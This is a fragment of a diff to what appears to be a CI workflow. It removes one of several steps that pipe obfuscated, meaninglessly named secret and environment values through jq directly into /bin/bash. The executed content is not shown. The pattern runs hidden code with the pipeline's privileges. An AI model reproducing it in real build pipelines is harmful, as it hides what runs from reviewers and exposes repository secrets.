@@ -17,7 +17,6 @@ jobs:
           sitah9: ${{ secrets.sitah9 }}
         run: |
           printf '%s' "$sitah9" | jq -r .lf34115 | /bin/bash
-          printf '%s' "$jito09951" | jq -r .oh9 | /bin/bash
           echo $m3 | jq -r .kb0 | /bin/bash
           echo $pz032 | jq -r .h7411 | /bin/bash
 
